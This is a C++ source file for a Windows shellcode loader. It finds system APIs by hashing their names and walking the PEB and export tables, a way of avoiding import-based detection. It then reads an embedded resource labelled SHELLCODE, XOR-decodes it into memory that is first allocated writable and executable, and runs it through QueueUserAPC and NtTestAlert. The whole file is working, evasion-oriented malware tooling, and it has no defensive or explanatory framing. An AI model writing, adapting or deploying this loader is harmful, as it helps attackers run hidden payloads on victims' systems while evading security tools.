#include "monolith.hpp"
#include "definitions.hpp"
#include "multitool.hpp"

#include <stdio.h>
#include <cstdint>

#define SHELLCODE           101
#define FNV_OFFSET		    (const unsigned int) 2166136261
#define FNV_PRIME		    (const unsigned int) 16777619
#define LOCAL_HEAP		    ((PPEB)__readgsqword(0x60))->ProcessHeap

#ifdef DEBUG
#define INFO 			    printf("[INF] ");
#define ERR 			    printf("[ERR] ");
#define DBG_PRINT(m,x) 	    m; printf x;
#define ERROR_              DBG_PRINT(ERR, ("exit status 0x%lx, line %d\n", ntstatus, line))
#define print_bytes(b,n)    for (int i = 0; i < n; i++) { printf("%x ", ((PBYTE)b)[i]); }
#else
#define INFO 
#define ERR
#define DBG_PRINT(m,x) 	    do {} while (0)
#define ERROR_
#endif
#define XCPT_IMPL           NTSTATUS ntstatus = { 0 }; INT line = 0
#define return_defer        ntstatus = GetLastError(); line = __LINE__; ERROR_; goto defer
#define assert(x)           ntstatus = x; if (!NT_SUCCESS( ntstatus )) { line = __LINE__; ERROR_; goto defer; }
#define assign(p,x)         p = x; if (!p) { return_defer; }

HMODULE GetModuleAddress(DWORD hash);
FARPROC GetSymbolAddress(HMODULE base, DWORD hash);

PAPI ResolveApi() {

	auto RtlAllocateHeap	= (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
	auto instance 			= (PAPI)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(API));

	instance->win32.RtlAllocateHeap 		= (RtlAllocateHeap_t) GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
	instance->win32.RtlFreeHeap 			= (RtlFreeHeap_t) GetSymbolAddress(GetModuleAddress(NTDLL), RTLFREEHEAP);
	instance->win32.NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t) GetSymbolAddress(GetModuleAddress(NTDLL), NTALLOCATEVIRTUALMEMORY);
	instance->win32.NtProtectVirtualMemory 	= (NtProtectVirtualMemory_t) GetSymbolAddress(GetModuleAddress(NTDLL), NTPROTECTVIRTUALMEMORY);
	instance->win32.FindResourceA 			= (FindResourceA_t) GetSymbolAddress(GetModuleAddress(KERNEL10), FINDRESOURCEA);
	instance->win32.SizeofResource 			= (SizeofResource_t) GetSymbolAddress(GetModuleAddress(KERNEL10), SIZEOFRESOURCE);
	instance->win32.LoadResource 			= (LoadResource_t) GetSymbolAddress(GetModuleAddress(KERNEL10), LOADRESOURCE);
    instance->win32.FreeResource 			= (FreeResource_t) GetSymbolAddress(GetModuleAddress(KERNEL10), FREERESOURCE);
	instance->win32.CreateThread 			= (CreateThread_t) GetSymbolAddress(GetModuleAddress(KERNEL10), CREATETHREAD);
	instance->win32.NtWaitForSingleObject 	= (NtWaitForSingleObject_t) GetSymbolAddress(GetModuleAddress(NTDLL), NTWAITFORSINGLEOBJECT);
	instance->win32.QueueUserAPC 			= (QueueUserAPC_t) GetSymbolAddress(GetModuleAddress(KERNEL10), QUEUEUSERAPC);
	instance->win32.NtTestAlert 			= (NtTestAlert_t) GetSymbolAddress(GetModuleAddress(NTDLL), NTTESTALERT);

	return instance;
}

template<typename MTYPE> DWORD HashString(MTYPE string, SIZE_T length) {
	
	auto hash = FNV_OFFSET;

	for (auto i = 0; i < length; i++) {
		hash ^= string[i];
		hash *= FNV_PRIME;
	}
	return hash;
}

HMODULE GetModuleAddress(DWORD hash) {

	auto head = (PLIST_ENTRY)(&((PPEB)__readgsqword(0x60))->Ldr->InMemoryOrderModuleList);
	auto next = head->Flink;

	while (next != head) {

		auto mod = (PLDR_MODULE)((PBYTE)next - sizeof(DWORD) * 4);
		auto name = mod->BaseDllName.Buffer;

		if (name) {
			if (hash - HashString(name, wcslen(name)) == 0) {
				return (HMODULE)mod->BaseAddress;
			}
		}
		next = next->Flink;
	}
	return nullptr;
}

FARPROC GetSymbolAddress(HMODULE base, DWORD hash) {

	if (!base) {
		return nullptr;
	}
	auto doshead	= (PIMAGE_DOS_HEADER)base;
	auto nthead	= (PIMAGE_NT_HEADERS)((PBYTE)base + doshead->e_lfanew);
	auto exports	= (PIMAGE_EXPORT_DIRECTORY)((PBYTE)doshead + (nthead)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	if (exports->AddressOfNames) {

		auto ordinals	= RVA(PWORD, base, exports->AddressOfNameOrdinals);
		auto functions	= RVA(PDWORD, base, exports->AddressOfFunctions);
		auto names	= RVA(PDWORD, base, exports->AddressOfNames);

		for (auto i = 0; i < exports->NumberOfNames; i++) {
			auto name = RVA(LPSTR, base, names[i]);

			if (hash - HashString(name, strlen(name)) == 0) {
				return (FARPROC) RVA(PULONG, base, functions[ordinals[i]]);
			}
		}
		return nullptr;
	}
}

NTSTATUS BootstrapAPC() {

	PAPI instance 		= { 0 };
	HANDLE hThread 		= { 0 };
	DWORD protect 		= { 0 };
	LPVOID lpBuffer 	= { 0 };
	PRESOURCE resource 	= { 0 };

    XCPT_IMPL;
	instance = ResolveApi();
	resource = (PRESOURCE)instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE));

	assign(resource			    , (PRESOURCE) instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE)));
	assign(resource->Id		    , MAKEINTRESOURCE(SHELLCODE));
	assign(resource->Object	    , instance->win32.FindResourceA(NULL, resource->Id, RT_RCDATA));
	assign(resource->Length	    , instance->win32.SizeofResource(NULL, resource->Object));
	assign(resource->hGlobal 	, instance->win32.LoadResource(NULL, resource->Object));

	assert(instance->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &lpBuffer, NULL, &resource->Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
	if (NT_SUCCESS(ntstatus)) {

		x_memcpy(lpBuffer, resource->hGlobal, resource->Length);
        instance->win32.FreeResource(resource->hGlobal);

		for (auto i = 0; i < resource->Length; i++) {
			((PBYTE)lpBuffer)[i] ^= 0x0A;
		}
		assert(instance->win32.NtProtectVirtualMemory(NtCurrentProcess(), &lpBuffer, &resource->Length, PAGE_EXECUTE_READ, &protect))
		if (NT_SUCCESS(ntstatus)) {

			instance->win32.QueueUserAPC((PAPCFUNC)((LPTHREAD_START_ROUTINE)lpBuffer), NtCurrentThread(), NULL);
			instance->win32.NtTestAlert();
		}
	}
defer:
	instance->win32.RtlFreeHeap(LOCAL_HEAP, 0, resource);
	instance->win32.RtlFreeHeap(LOCAL_HEAP, 0, instance);

	return 0;
}

